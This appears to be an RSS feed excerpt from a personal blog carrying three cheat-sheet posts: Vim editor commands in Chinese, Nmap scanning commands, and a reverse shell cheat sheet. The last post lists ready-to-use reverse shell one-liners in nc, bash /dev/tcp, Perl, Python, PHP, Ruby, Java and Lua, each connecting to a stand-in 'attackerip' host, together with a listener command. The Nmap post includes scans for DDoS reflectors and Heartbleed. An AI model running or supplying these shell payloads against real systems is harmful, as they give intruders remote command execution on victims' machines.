&lt;p>转载自：&lt;a href="https://m.weibo.cn/detail/4526016293356439">原文地址&lt;/a> 作者：不太老&lt;/p></description></item><item><title>Vim Cheat Sheet</title><link>https://hare001.github.io/posts/vim-cheat-sheet/</link><pubDate>Wed, 01 Jul 2020 17:32:10 +0800</pubDate><guid>https://hare001.github.io/posts/vim-cheat-sheet/</guid><description>&lt;h3 id="全局">全局&lt;/h3>
&lt;pre>&lt;code class="language-wiki" data-lang="wiki">:h[elp] 关键字 - 打开关键字帮助
:sav[eas] 文件名 - 另存为
:clo[se] - 关闭当前窗口
:ter[minal] - open a terminal window
K - 打开光标所在单词的man页面
&lt;/code>&lt;/pre>&lt;h3 id="移动光标">移动光标&lt;/h3>
&lt;pre>&lt;code class="language-wiki" data-lang="wiki">h - 左移光标
j - 下移光标
k - 上移光标
l - 右移光标
H - 移动到当前页面顶部
M - 移动到当前页面中间
L - 移动到当前页面底部
w - 移动到下个单词开头
W - 移动到下个单词开头(单词含标点)
e - 移动到下个单词结尾
E - 移动到下个单词结尾(单词含标点)
b - 移动到上个单词开头
B - 移动到上个单词开头(单词含标点)
% - 跳转到配对的符号(默认支持的配对符号组:: '()', '{}', '[]' - 在vim中使用 :h matchpairs 获得更多信息)
0 - 移动到行首
^ - 移动到行首的非空白符
$ - 移动到行尾
g_ - 移动到行内最后一个非空白符
gg - 移动到文件第一行
G - 移动到文件最后一行
5gg or 5G - 移动到第五行
fx - 移动到字符 x 下次出现的位置
tx - 移动到字符 x 下次出现的位置的前一个字符
Fx - 移动到字符 x 上次出现的位置
Tx - 移动到字符 x 上次出现的位置的后一个字符
; - 重复之前的f、t、F、T操作
, - 反向重复之前的f、t、F、T操作
} - 移动到下一个段落 (当编辑代码时则为函数／代码块)
{ - 移动到上一个段落 (当编辑代码时则为函数／代码块)
zz - 移动屏幕使光标居中
Ctrl + e - 向下移动屏幕一行(保持光标不动)
Ctrl + y - 向上移动屏幕一行(保持光标不动)
Ctrl + b - 向上滚动一屏
Ctrl + f - 向下滚动一屏
Ctrl + d - 向下滚动半屏
Ctrl + u - 向上滚动半屏
&lt;/code>&lt;/pre>&lt;h3 id="插入模式---插入追加文本">插入模式 - 插入/追加文本&lt;/h3>
&lt;pre>&lt;code class="language-wiki" data-lang="wiki">i - 从光标前开始插入字符
I - 从行首开始插入字符
a - 从光标后开始插入字符
A - 从行尾开始插入字符
o - 在当前行之下另起一行, 开始插入字符
O - 在当前行之上另起一行, 开始插入字符
ea - 从当前单词末尾开始插入
Ctrl + h - 在插入模式下，删除光标之前的一个字符
Ctrl + w - 在插入模式下，删除光标之前的一个单词
Ctrl + j - 在插入模式下，从光标处开始新行
Ctrl + t - 在插入模式下，缩进一个宽度
Ctrl + d - 在插入模式下，取消缩进一个宽度
Ctrl + n - 在插入模式下，用下一个匹配自动补全
Ctrl + p - 在插入模式下，用上一个匹配自动补全
Esc - 退出插入模式
&lt;/code>&lt;/pre>&lt;h3 id="编辑文本">编辑文本&lt;/h3>
&lt;pre>&lt;code class="language-wiki" data-lang="wiki">r - 替换当前字符
J - 将下一行合并到当前行, 并在两部分文本之间插入一个空格
gJ - 将下一行合并到当前行, 两部分文本之间不含空格
gwip - 重新调整段落
g~ - 切换所选区域大小写
gu - 将所选区域调整为小写
gU - 将所选区域调整为大写
cc - 将光标所在的行删除, 然后进入插入模式
C - 将光标处到行尾删除, 然后进入插入模式
c$ - 将光标处到行尾删除, 然后进入插入模式
ciw - 将光标所在的单词删除, 然后进入插入模式
cw - 从光标位置开始, 修改单词
s - 删除当前字符, 然后进入插入模式
S - 清空当前行, 然后进入插入模式 (同cc)
xp - 当前字符后移
u - 撤销
U - 撤销本当前行的上次操作
Ctrl + r - 重复
. - 再次执行上个命令
&lt;/code>&lt;/pre>&lt;h3 id="选择文本可视化模式">选择文本（可视化模式）&lt;/h3>
&lt;pre>&lt;code class="language-wiki" data-lang="wiki">v - 进入可视化模式, 移动光标高亮选择, 然后可以对选择的文本执行命令(比如y-复制)
V - 进入可视化模式(行粒度选择)
o - 切换光标到选择区开头/结尾
Ctrl + v - 进入可视化模式(矩阵选择)
O - 切换光标到选择区的角
aw - 选择当前单词
ab - 选择被 () 包裹的区域(含括号)
aB - 选择被 {} 包裹的区域(含花括号)
at - 选择被 &amp;lt;&amp;gt; 包裹的区域(含尖括号)
ib - 选择被 () 包裹的区域(不含括号)
iB - 选择被 {} 包裹的区域(不含花括号)
it - 选择被 &amp;lt;&amp;gt; 包裹的区域(不含尖括号)
Esc - 退出可视化模式
&lt;/code>&lt;/pre>&lt;h3 id="可视化模式命令">可视化模式命令&lt;/h3>
&lt;pre>&lt;code class="language-wiki" data-lang="wiki">&amp;gt; - 向右缩进
&amp;lt; - 向左缩进
y - 复制
d - 剪切
~ - 大小写切换
u - 将选定区域切换为小写
U - 将选定区域切换为大写
&lt;/code>&lt;/pre>&lt;h3 id="寄存器">寄存器&lt;/h3>
&lt;pre>&lt;code class="language-wiki" data-lang="wiki">:reg[isters] - 显示寄存器内容
&amp;quot;xy - 复制内容到寄存器 x
&amp;quot;xp - 粘贴寄存器 x 中的内容
&amp;quot;+y - 复制内容到系统剪贴板寄存器
&amp;quot;+p - 从系统剪贴板寄存器中粘贴
Tip 寄存器被存储在 ~/.viminfo 中, 在下次重启vim时仍会加载
&lt;/code>&lt;/pre>&lt;h3 id="标记">标记&lt;/h3>
&lt;pre>&lt;code class="language-wiki" data-lang="wiki">:marks - 标记列表
ma - 设置当前位置为标记 a
`a - 跳转到标记 a 的位置
y`a - 复制当前位置到标记 a 的内容
`0 - 跳转到 Vim 上一次使用文件的位置
`&amp;quot; - 跳转到上一次退出文件时的位置
`. - 跳转到当前文件最近编辑的位置
`` - 跳转到上一次跳转前的位置
:ju[mps] - 列出跳转位置
Ctrl + i - 向前跳到前几次光标位置
Ctrl + o - 向后跳到后几次光标位置
:changes - 列出当前文件的所有改动
g, - 跳转到改动列表里面更新的位置
g; - 跳转到改动列表里面更旧的位置
Ctrl + ] - 跳转到光标所在位置的 tag
&lt;/code>&lt;/pre>&lt;h3 id="宏">宏&lt;/h3>
&lt;pre>&lt;code class="language-wiki" data-lang="wiki">qa - 录制宏 a
q - 停止录制宏
@a - 执行宏 a
@@ - 重新执行上次执行的宏
&lt;/code>&lt;/pre>&lt;h3 id="剪切-复制-粘贴">剪切, 复制, 粘贴&lt;/h3>
&lt;pre>&lt;code class="language-wiki" data-lang="wiki">yy - 复制当前行
2yy - 复制 2 行
yw - 复制当前单词
y$ - 复制, 从光标位置到行末
p - 在光标后粘贴
P - 在光标前粘贴
dd - 剪切当前行
2dd - 剪切 2 行
dw - 剪切当前单词
D - 剪切, 从光标位置到行末
d$ - 剪切, 从光标位置到行末 (同D)
x - 剪切当前字符
&lt;/code>&lt;/pre>&lt;h3 id="文本缩进">文本缩进&lt;/h3>
&lt;pre>&lt;code class="language-wiki" data-lang="wiki">&amp;gt;&amp;gt; - 当前行增加shiftwidth宽度的缩进
&amp;lt;&amp;lt; - 当前行减少shiftwidth宽度的缩进
&amp;gt;% - 增加缩进当前光标位置被 () 或 {} 包裹的代码块(包括 (){})
&amp;gt;ib - 增加缩进被 () 包裹的代码块(不包括())
&amp;gt;at - 增加缩进被 &amp;lt;&amp;gt; 包裹的代码块
3== - 重新缩进三行
=% - 重新缩进光标位置所在处被 () 或 {} 包裹的代码块(包括 (){})
=iB - 重新缩进被 {} 包裹的代码块(不包括 {})
gg=G - 重新缩进全文
]p - 粘贴并调整缩进以匹配当前行
&lt;/code>&lt;/pre>&lt;h3 id="退出">退出&lt;/h3>
&lt;pre>&lt;code class="language-wiki" data-lang="wiki">:w - 保存
:w !sudo tee % - 使用 sudo 保存当前文件
:wq or :x or ZZ - 保存并退出
:q - 退出(修改未保存时警告)
:q! or ZQ - 不保存强制退出
:wqa - 保存所有标签页并全部退出
&lt;/code>&lt;/pre>&lt;h3 id="查找替换">查找/替换&lt;/h3>
&lt;pre>&lt;code class="language-wiki" data-lang="wiki">/pattern - 查找pattern
?pattern - 向上查找pattern
\vpattern - pattern 中的非字母数字字符被视为正则表达式特殊字符 (不需转义字符)
n - 查找下一个
N - 查找上一个
:%s/old/new/g - 替换全部
:%s/old/new/gc - (逐个)替换
:noh[lsearch] - 移除搜索结果的高亮显示
&lt;/code>&lt;/pre>&lt;h3 id="多文件搜索">多文件搜索&lt;/h3>
&lt;pre>&lt;code class="language-wiki" data-lang="wiki">:vim[grep] /pattern/ {`{file}`} - 在多个文件中搜索 pattern
:cn[ext] - 移动至下一个
:cp[revious] - 移动至上一个
:cope[n] - 打开搜索结果列表
&lt;/code>&lt;/pre>&lt;h3 id="多文件编辑">多文件编辑&lt;/h3>
&lt;pre>&lt;code class="language-wiki" data-lang="wiki">:e[dit] 文件名 - 新建缓冲区打开 filename
:bn[ext] or :bn - 切换到下个缓冲区
:bp[revious] or :bp - 切换到上个缓冲区
:bd[elete] - 关闭缓冲区
:b# - 按数字编号跳转到缓冲
:b file - 按文件名跳转到缓冲
:ls - 列出所有打开的缓冲区
:sp[lit] 文件名 - 新建缓冲区打开 filename 并水平分割窗口
:vs[plit] 文件名 - 新缓冲区打开 filename 并垂直分割窗口
:vert[ical] ba[ll] - 以垂直分割窗口编辑缓冲区
:tab ba[ll] - 以标签页编辑缓冲区
Ctrl + ws - 水平分割窗口
Ctrl + wv - 垂直分割窗口
Ctrl + ww - 在窗口间切换
Ctrl + wq - 关闭窗口
Ctrl + wx - 交换当前窗口和下一个窗口
Ctrl + w= - 调整所有窗口等宽高
Ctrl + wh - 切换到右侧窗口
Ctrl + wl - 切换到左侧窗口
Ctrl + wj - 切换到下侧窗口
Ctrl + wk - 切换到上侧窗口
&lt;/code>&lt;/pre>&lt;h3 id="标签">标签&lt;/h3>
&lt;pre>&lt;code class="language-wiki" data-lang="wiki">:tabnew or :tabnew {page.words.file} - 在新标签中打开文件
Ctrl + wT - 将窗口变成标签
gt or :tabn[ext] - 切换到下一个标签
gT or :tabp[revious] - 切换到上一个标签
#gt - 切换到第 # 个标签
:tabm[ove] # - 移动标签到第 # 位(下标从 0 开始)
:tabc[lose] - 关闭当前标签
:tabo[nly] - 关闭其他标签
:tabdo command - 在所有标签中执行命令 (例如 :tabdo q 关闭所有标签)
&lt;/code>&lt;/pre>&lt;h3 id="diff">Diff&lt;/h3>
&lt;pre>&lt;code class="language-wiki" data-lang="wiki">zf - 手动定义向上折叠
zd - 删除光标下的折叠
za - 切换光标下折叠状态
zo - 打开光标下的折叠
zc - 关闭光标下的折叠
zr - 减少 (reduce) 折叠
zm - 折起更多 (more)
zi - 翻转 'foldenable' 的值
]c - 跳转到下个差异点
[c - 跳转到上个差异点
do or :diffg[et] - 将另一窗口中差异点处的内容拉取到当前位置并进行替换操作
dp or :diffpu[t] - 将当前差异点中的内容覆盖到另一文件中的对应位置
:diffthis - 使当前窗口参与比较
:dif[fupdate] - 刷新比较结果的高亮和折叠
:diffo[ff] - 为当前窗口关闭比较模式
&lt;/code>&lt;/pre></description></item><item><title>Nmap Cheat Sheet</title><link>https://hare001.github.io/posts/namp-cheat-sheet/</link><pubDate>Wed, 01 Jul 2020 17:27:34 +0800</pubDate><guid>https://hare001.github.io/posts/namp-cheat-sheet/</guid><description>&lt;h3 id="nmap-target-selection">Nmap Target Selection&lt;/h3>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Scan a single IP&lt;/span>
nmap 192.168.1.1
&lt;span style="color:#75715e">#Scan a host&lt;/span>
nmap www.testhostname.com
&lt;span style="color:#75715e">#Scan a range of IPs&lt;/span>
nmap 192.168.1.1-20
&lt;span style="color:#75715e">#Scan a subnet&lt;/span>
nmap 192.168.1.0/24
&lt;span style="color:#75715e">#Scan targets from a text file&lt;/span>
nmap -iL list-of-ips.txt
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="nmap-port-selection">Nmap Port Selection&lt;/h3>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Scan a single Port&lt;/span>
nmap -p &lt;span style="color:#ae81ff">22&lt;/span> 192.168.1.1
&lt;span style="color:#75715e">#Scan a range of ports&lt;/span>
nmap -p 1-100 192.168.1.1
&lt;span style="color:#75715e">#Scan 100 most common ports (Fast)&lt;/span>
nmap -F 192.168.1.1
&lt;span style="color:#75715e">#Scan all 65535 ports&lt;/span>
nmap -p- 192.168.1.1
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="nmap-port-scan-types">Nmap Port Scan types&lt;/h3>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Scan using TCP connect&lt;/span>
nmap -sT 192.168.1.1
&lt;span style="color:#75715e">#Scan using TCP SYN scan (default)&lt;/span>
nmap -sS 192.168.1.1
&lt;span style="color:#75715e">#Scan UDP ports&lt;/span>
nmap -sU -p 123,161,162 192.168.1.1
&lt;span style="color:#75715e">#Scan selected ports - ignore discovery&lt;/span>
nmap -Pn -F 192.168.1.1
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="service-and-os-detection">Service and OS Detection&lt;/h3>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Detect OS and Services&lt;/span>
nmap -A 192.168.1.1
&lt;span style="color:#75715e">#Standard service detection&lt;/span>
nmap -sV 192.168.1.1
&lt;span style="color:#75715e">#More aggressive Service Detection&lt;/span>
nmap -sV --version-intensity &lt;span style="color:#ae81ff">5&lt;/span> 192.168.1.1
&lt;span style="color:#75715e">#Lighter banner grabbing detection&lt;/span>
nmap -sV --version-intensity &lt;span style="color:#ae81ff">0&lt;/span> 192.168.1.1
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="nmap-output-formats">Nmap Output Formats&lt;/h3>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Save default output to file&lt;/span>
nmap -oN outputfile.txt 192.168.1.1
&lt;span style="color:#75715e">#Save results as XML&lt;/span>
nmap -oX outputfile.xml 192.168.1.1
&lt;span style="color:#75715e">#Save results in a format for grep&lt;/span>
nmap -oG outputfile.txt 192.168.1.1
&lt;span style="color:#75715e">#Save in all formats&lt;/span>
nmap -oA outputfile 192.168.1.1
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="digging-deeper-with-nse-scripts">Digging deeper with NSE Scripts&lt;/h3>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Scan using default safe scripts&lt;/span>
nmap -sV -sC 192.168.1.1
&lt;span style="color:#75715e">#Get help for a script&lt;/span>
nmap --script-help&lt;span style="color:#f92672">=&lt;/span>ssl-heartbleed
&lt;span style="color:#75715e">#Scan using a specific NSE script&lt;/span>
nmap -sV -p &lt;span style="color:#ae81ff">443&lt;/span> –script&lt;span style="color:#f92672">=&lt;/span>ssl-heartbleed.nse 192.168.1.1
&lt;span style="color:#75715e">#Scan with a set of scripts&lt;/span>
nmap -sV --script&lt;span style="color:#f92672">=&lt;/span>smb* 192.168.1.1
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="a-scan-to-search-for-ddos-reflection-udp-services">A scan to search for DDOS reflection UDP services&lt;/h3>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Scan for UDP DDOS reflectors&lt;/span>
nmap –sU –A –PN –n –pU:19,53,123,161 –script&lt;span style="color:#f92672">=&lt;/span>ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="http-service-information">HTTP Service Information&lt;/h3>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Gather page titles from HTTP services&lt;/span>
nmap --script&lt;span style="color:#f92672">=&lt;/span>http-title 192.168.1.0/24
&lt;span style="color:#75715e">#Get HTTP headers of web services&lt;/span>
nmap --script&lt;span style="color:#f92672">=&lt;/span>http-headers 192.168.1.0/24
&lt;span style="color:#75715e">#Find web apps from known paths&lt;/span>
nmap --script&lt;span style="color:#f92672">=&lt;/span>http-enum 192.168.1.0/24
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="detect-heartbleed-ssl-vulnerability">Detect Heartbleed SSL Vulnerability&lt;/h3>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Heartbleed Testing&lt;/span>
nmap -sV -p &lt;span style="color:#ae81ff">443&lt;/span> --script&lt;span style="color:#f92672">=&lt;/span>ssl-heartbleed 192.168.1.0/24
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="ip-address-information">IP Address information&lt;/h3>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Find Information about IP address&lt;/span>
nmap --script&lt;span style="color:#f92672">=&lt;/span>asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24
&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Reverse Shell Cheat Sheet</title><link>https://hare001.github.io/posts/reverse-shell-cheat-sheet/</link><pubDate>Tue, 30 Jun 2020 17:22:05 +0800</pubDate><guid>https://hare001.github.io/posts/reverse-shell-cheat-sheet/</guid><description>&lt;h2 id="利用-nc-监听端口">利用 nc 监听端口&lt;/h2>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">nc -lvp &lt;span style="color:#ae81ff">2333&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="nc-版本">nc 版本：&lt;/h2>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">nc -e /bin/sh attackerip &lt;span style="color:#ae81ff">2333&lt;/span>
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc attackerip &lt;span style="color:#ae81ff">2333&lt;/span> &amp;gt;/tmp/f
nc attackerip 8888|/bin/sh|nc attackerip &lt;span style="color:#ae81ff">9999&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="bash-版本">Bash 版本：&lt;/h2>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">bash -i &amp;gt;&amp;amp; /dev/tcp/attackerip/2333 0&amp;gt;&amp;amp;&lt;span style="color:#ae81ff">1&lt;/span>
bash -i &amp;gt;&amp;amp; /dev/tcp/attackerip/2333 &amp;lt;&amp;amp;&lt;span style="color:#ae81ff">2&lt;/span>
exec 5&amp;lt;&amp;gt;/dev/tcp/attackerip/2333;cat &amp;lt;&amp;amp;5|&lt;span style="color:#66d9ef">while&lt;/span> read line;&lt;span style="color:#66d9ef">do&lt;/span> $line &amp;gt;&amp;amp;&lt;span style="color:#ae81ff">5&lt;/span> 2&amp;gt;&amp;amp;1;&lt;span style="color:#66d9ef">done&lt;/span>
0&amp;lt;&amp;amp;196;exec 196&amp;lt;&amp;gt;/dev/tcp/attackerip/4444; sh &amp;lt;&amp;amp;&lt;span style="color:#ae81ff">196&lt;/span> &amp;gt;&amp;amp;&lt;span style="color:#ae81ff">196&lt;/span> 2&amp;gt;&amp;amp;&lt;span style="color:#ae81ff">196&lt;/span>
mknod backpipe p; nc attackerip &lt;span style="color:#ae81ff">2333&lt;/span> 0&amp;lt;backpipe | /bin/bash 1&amp;gt;backpipe 2&amp;gt;backpipe
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="perl-版本">Perl 版本:&lt;/h2>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">perl -e &lt;span style="color:#e6db74">&amp;#39;use Socket;$i=&amp;#34;attackerip&amp;#34;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);exec(&amp;#34;/bin/sh -i&amp;#34;);};&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="python-版本">Python 版本：&lt;/h2>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python -c &lt;span style="color:#e6db74">&amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;attackerip&amp;#34;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="php-版本">php 版本：&lt;/h2>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">php -r &lt;span style="color:#e6db74">&amp;#39;$sock=fsockopen(&amp;#34;attackerip&amp;#34;,2333);exec(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#34;);&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="ruby-版本">Ruby 版本：&lt;/h2>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ruby -rsocket -e&lt;span style="color:#e6db74">&amp;#39;f=TCPSocket.open(&amp;#34;attackerip&amp;#34;,2333).to_i;exec sprintf(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;#34;,f,f,f)&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="java-版本">Java 版本：&lt;/h2>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">r &lt;span style="color:#f92672">=&lt;/span> Runtime.getRuntime&lt;span style="color:#f92672">()&lt;/span>
p &lt;span style="color:#f92672">=&lt;/span> r.exec&lt;span style="color:#f92672">([&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/bin/bash&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;-c&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;exec 5&amp;lt;&amp;gt;/dev/tcp/attackerip/2333;cat &amp;lt;&amp;amp;5 | while read line; do \\&lt;/span>$line&lt;span style="color:#e6db74"> 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&amp;#34;&lt;/span>&lt;span style="color:#f92672">]&lt;/span> as String&lt;span style="color:#f92672">[])&lt;/span>
p.waitFor&lt;span style="color:#f92672">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="lua-版本">Lua 版本：&lt;/h2>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">lua -e &lt;span style="color:#e6db74">&amp;#34;require(&amp;#39;socket&amp;#39;);require(&amp;#39;os&amp;#39;);t=socket.tcp();t:connect(&amp;#39;attackerip&amp;#39;,&amp;#39;2333&amp;#39;);os.execute(&amp;#39;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#39;);&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div></description></item></channel></rss>